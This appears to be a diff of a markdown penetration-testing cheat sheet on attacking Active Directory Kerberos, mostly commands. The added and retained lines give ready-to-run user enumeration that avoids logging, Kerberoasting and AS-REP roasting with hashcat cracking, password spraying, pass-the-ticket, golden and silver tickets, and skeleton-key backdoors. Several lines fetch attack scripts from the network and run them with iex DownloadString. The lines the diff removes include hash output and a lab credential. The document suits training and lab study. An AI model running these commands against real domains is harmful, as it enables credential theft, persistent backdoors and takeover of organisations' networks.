@@ -40,8 +40,12 @@
 ## Enumeration with Kerbrute
 
 * Add the domain name to `/etc/hosts`
+* Kerbrute uses Kerberos Pre-Authentication to enumerate — this is stealthier than other methods
+* Does **not** trigger Windows event ID 4625 (account failed logon)
+* Only generates event ID 4768 (Kerberos TGT requested)
+* Grab wordlists from https://github.com/insidetrust/statistically-likely-usernames
 
-### Abusing Pre-Authentication Overview -
+### Abusing Pre-Authentication Overview
 
 * By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams.
 * When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
@@ -52,14 +56,12 @@
 * Rename kerbrute\_linux\_amd64 to kerbrute
 * `chmod +x kerbrute` - make kerbrute executable
 
-### Enumerating Users w/ Kerbrute -
+### Enumerating Users w/ Kerbrute
 
 * Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.
-* `cd` into the directory that you put `Kerbrute`
-* Download the wordlist to enumerate with (in this repo)
 
 ```
-./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 ```
 
 * This will brute force user accounts from a domain controller using a supplied wordlist
@@ -71,11 +73,148 @@
 auxiliary/gather/kerberos_enumusers
 ```
 
-## AS-REP Roasting&#x20;
+## Kerberoasting
+
+### Overview
+
+* Kerberoasting is a lateral movement/privilege escalation technique targeting Service Principal Name (SPN) accounts
+* Any domain user can request a Kerberos ticket for any service account in the same domain
+* The TGS-REP ticket is encrypted with the service account's NTLM hash
+* We can grab that ticket and crack the cleartext password offline with hashcat
+* If the service has a registered SPN then it can be Kerberoastable — success depends on how strong the password is and the privileges of the cracked account
+* Use BloodHound to find all Kerberoastable accounts and see if they're domain admins or have interesting connections
+
+### Kerberoasting with GetUserSPNs.py (Linux)
+
+```
+# List SPN accounts
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+# Request all TGS tickets
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+
+# Request a single user's ticket
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+
+# Save to output file
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+
+### Kerberoasting with Rubeus (Windows)
+
+```
+# View kerberoastable stats
+.\Rubeus.exe kerberoast /stats
+
+# Kerberoast all accounts with admincount=1
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+# Kerberoast specific user
+.\Rubeus.exe kerberoast /user:sqldev /nowrap
+
+# Force RC4 for AES-enabled accounts (does not work against Server 2019 DCs)
+.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
+```
+
+### Kerberoasting with PowerView (Windows)
+
+```
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+
+# Target specific user
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Export all to CSV
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+### Semi-Manual Method (Windows)
+
+```
+# Enumerate SPNs
+setspn.exe -Q */*
+```
+
+```
+# Request ticket using PowerShell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+```
+# Extract with Mimikatz
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+```
+
+### Kerberoasting with Invoke-Kerberoast (Windows)
+
+```
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+```
+
+```
+. .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat hashcat |fl
+```
+
+### Cracking TGS Tickets
+
+```
+# RC4 (type 23) - hashcat mode 13100
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+
+# AES-256 (type 18) - hashcat mode 19700 (much slower to crack)
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+* To show the cracked password after it finishes:
+
+```
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+### Encryption Types
+
+* RC4 (type 23) is the default and easiest to crack — hash starts with `$krb5tgs$23$*`
+* AES-256 (type 18) is much harder to crack — hash starts with `$krb5tgs$18$*`
+* Check supported encryption with PowerView:
+
+```
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+* Value `0` = RC4_HMAC_MD5 (default)
+* Value `24` = AES 128/256 only
+* Use the `/tgtdeleg` flag in Rubeus to force RC4 even for AES-enabled accounts (does **not** work on Server 2019 DCs)
+
+### Targeted Kerberoasting (via ACL Abuse)
+
+* If you have GenericAll/GenericWrite over a user, you can set a fake SPN on them then Kerberoast their account:
+
+```
+# Set a fake SPN
+Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+* Kerberoast that user, then clean up by removing the SPN:
+
+```
+Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipalname -Verbose
+```
+
+### Kerberoasting Mitigation
+
+* Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
+* Set long, complex passwords on service accounts (25+ characters)
+* Monitor event IDs 4769 (Kerberos service ticket requested) and 4770 (Kerberos service ticket renewed)
+* Restrict RC4 usage where possible — enforce AES encryption
+
+## AS-REP Roasting
 
 * AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
-* Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
-* There are other tools out as well for AS-REP Roasting such as `kekeo` and Impacket's `GetNPUsers.py`
+* Unlike Kerberoasting these users do not have to be service accounts — the only requirement is that the user must have pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`).
 
 ### AS-REP Roasting Overview
 
@@ -83,55 +222,38 @@ auxiliary/gather/kerberos_enumusers
 * After validating the timestamp the KDC will then issue a TGT for the user.
 * If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
 
-### Dumping KRBASREP5 Hashes with Rubeus (local)
+### AS-REP Roasting with GetNPUsers.py (Linux)
 
-* `cd Downloads` - navigate to the directory Rubeus is in
+```
+# With a user list
+GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.161 -request -usersfile users.txt
+
+# Single user (just press enter when it asks for a password)
+GetNPUsers.py DOMAIN/svc-alfresco -dc-ip 10.10.10.161 -no-pass
+
+# Loop through users
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 DOMAIN/${user} | grep -v Impacket; done
+```
+
+### AS-REP Roasting with Rubeus (Windows)
+
 * This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
 
 ```
 Rubeus.exe asreproast
 ```
 
-#### Crack those Hashes with hashcat
+### Cracking AS-REP Hashes
 
-* Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
-* Insert `23$` after `$krb5asrep$` so that the first line will be $krb5asrep$23$User.....
-* Crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
-
-```
-hashcat -m 18200 hash.txt Pass.txt
-```
-
-### AS-REP Roasting with Impacket (remote)
-
-* This attack takes advantage of users that have `UF_DONT_REQUIRE_PREAUTH` set.  This will allow us to steal their `$krb` hash, which once cracked will allow remote authentication via rdp winrm, smb etc.
+* Transfer the hash from the target machine to your attacker machine and put it into a txt file
+* Insert `23$` after `$krb5asrep$` so that the first line will be `$krb5asrep$23$User.....`
+* Crack with hashcat mode 18200:
 
 ```
-sudo python /opt/impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -usersfile /home/kali/Documents/htb/forest/loot/user.txt
-#output
-Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation
-
-[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:12a052338596b97da3d3a45db829b01d$f6a2d6438e7afec40f4a6a8c798dd5489953e91c742248dba6d8549d8b0adde9e9d655fc58653d9c66c618139e51c4e30bf2639c867f96803118c9f08c7e7f09c21b817cdb495dd57715f501d0ca3d7aebe61f9fda4e8b31232516cfd1c2237278e3e0de31d180042bc2a588d907b1001b24657350683f005d6db20fdaac5e06412c1a90ef75e5f962254fcc9e3094e0396d354f0c17211ea081d13b1c822366ef2c256d39572872d38d475c934f322b75129bdf05cc737a555446ee62265c22cb6e92ea890ec23da455e5fb715d0ac8db5630e85a2bef7210b5e59555073a0dcbd8cc1118fc
-[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
- 
-#another option
-for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-```
-sudo python /opt/impacket/examples/GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161
-Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation
-Password: 
-[*] Cannot authenticate svc-alfresco, getting its TGT $krb5asrep$23$svc-alfresco@HTB.LOCAL:1d6d0d121b56b32b2b13b689da2a8893$c01bfb3b9d3b472411c8897fe6557997d08bf5c8bb31c07a7a5370aebd2a99a7684434d8e8e50105e855cf3e7d4c80c4dabada3416fd9c6cc38cc0775c7e627f3828a044fe6441985b65210356304fa90bbd4a3c33fd969f03eeee745f299678ecdeb759add7a6afd46713f7f44e3118bdc74f44d37f891b6c899e46858f93c830470148ac49af820d007628513cf72b86f568072d0dc7c7d2f25b11bbc223168d05050133865ba1aedfe8e4c1bd24fefe599f20be7faf48b3306afb5345988b9de69f1760b14575f5cdf0814d8f8fc087aba7959fdeceffc2edc492cca735d09c9b0ee6f0c9Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
-```
-
-* In the second example when it asks for a password, just hit enter
-
-## Rubeus
+## Rubeus TGT Harvesting
 
 * This command tells Rubeus to harvest for TGTs every 30 seconds
 
@@ -144,9 +266,7 @@ Rubeus.exe harvest /interval:30
 ### Brute-Forcing and Password-Spraying with Rubeus
 
 * Rubeus can both brute force passwords as well as password spray user accounts
-* This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket.
-* Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file.
-* You can add the IP and domain name to the hosts file from the machine by using the echo command:
+* Before password spraying with Rubeus, add the domain controller domain name to the windows host file:
 
 ```
 echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
@@ -155,72 +275,13 @@ echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 * This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
 
 ```
-Rubeus.exe brute /password:Password1 /noticket 
+Rubeus.exe brute /password:Password1 /noticket
 ```
 
 * ![alt text](https://i.imgur.com/WN4zVo5.png)
 * Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
 
-## Kerberoasting with Rubeus and Impacket
-
-* Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
-* If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.
-* To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts.
-* It will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.
-
-### Kerberoasting with Rubeus
-
-* This will dump the Kerberos hash of any kerberoastable users
-
-```
-Rubeus.exe kerberoast
-```
-
-* Copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
-
-```
-hashcat -m 13100 -a 0 hash.txt Pass.txt
-```
-
-### Kerberoasting with Impacket
-
-#### Impacket Installation
-
-* Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
-* `cd /opt` navigate to your preferred directory to save tools in
-* Download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19
-* `cd Impacket-0.9.19` navigate to the impacket directory
-* `pip install .` - this will install all needed dependencies
-
-### Kerberoasting w/ Impacket -
-
-* Navigate to where GetUserSPNs.py is located
-
-```
-cd /usr/share/doc/python3-impacket/examples/ 
-```
-
-* This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
-
-```
-sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.121.111 -request
-└─$ sudo python3 GetUserSPNs.py htb.local/svc-alfresco:s3rvice -dc-ip 10.10.10.161 -request
-
-```
-
-* Now crack that hash
-
-```
-hashcat -m 13100 -a 0 hash.txt Pass.txt 
-```
-
-* Once cracked to show the password
-
-```
-hashcat -m 13100 -a 0 /tmp/http1.txt Pass.txt --show
-```
-
-## Pass the Ticket with mimikatz
+## Pass the Ticket with Mimikatz
 
 ### Pass the Ticket Overview
 
@@ -265,7 +326,7 @@ kerberos::ptt <ticket>
 klist
 ```
 
-## Golden and Silver Ticket Attacks with mimikatz
+## Golden and Silver Ticket Attacks with Mimikatz
 
 * A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet.
 * The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
@@ -314,7 +375,7 @@ misc::cmd
 * However, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
 * ![alt text](https://i.imgur.com/BSh4rXy.png)
 
-## Kerberos Backdoors with mimikatz
+## Kerberos Backdoors with Mimikatz (Skeleton Key)
 
 * A Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
 * The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.
@@ -340,73 +401,28 @@ misc::skeleton
 * The share will now be accessible without the need for the Administrators password
 
 ```
-net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
+net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 ```
 
 * Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
 
 ```
-dir \\Desktop-1\c$ /user:Machine1 mimikatz 
+dir \\Desktop-1\c$ /user:Machine1 mimikatz
 ```
 
 * The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques
 
-### Service Principle Name SPN
+## Kerberos Double Hop Problem
 
-* Lets first enumerate Windows. If we run
+* This occurs when we're using WinRM/PowerShell remoting across two or more hops
+* Default Kerberos authentication only provides a ticket for the specific resource — our creds don't follow us to the next hop
+* The user's password/NTLM hash is **not** cached in the WinRM session, so we can't authenticate further
+* Workarounds:
+  * Create a `PSCredential` object within the session and pass it explicitly
+  * Register a new PSSession configuration with `Register-PSSessionConfiguration` that uses `RunAsCredential`
+  * Use `CredSSP` (not recommended in production — delegates credentials to the remote server)
 
-```
-setspn -T medin -Q */* 
-```
-
-* We can extract all accounts in the SPN. SPN is the Service Principal Name, and is the mapping between service and account.
-* Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
-* Lets first get the Powershell Invoke-Kerberoast script.
-
-```
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
-powershell Invoke-WebRequest -Uri http://10.13.22.22:8000/Invoke-Kerberoast.ps1 -OutFile C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1
-```
-
-* Now lets load this into memory:
-
-```
-. .\Invoke-Kerberoast.ps1
-Invoke-Kerberoast -OutputFormat hashcat |fl
-```
-
-* You should get a SPN ticket.
-* Crack with hashcat
-
-```
-hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-```
-
-## Priv Esc
-
-* We will run PowerUp.ps1 for the enumeration.
-* Lets load PowerUp1.ps1 into memory.
-
-```
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
-```
-
-* Load into memory
-
-```
-. .\PowerUp.ps1
-Invoke-AllChecks
-```
-
-* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."
-
-It is also where users passwords are stored in base64. Navigate to:
-
-```
-C:\Windows\Panther\Unattend\Unattended.xml.
-```
-
-### Resources
+## Resources
 
 * https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
 * https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
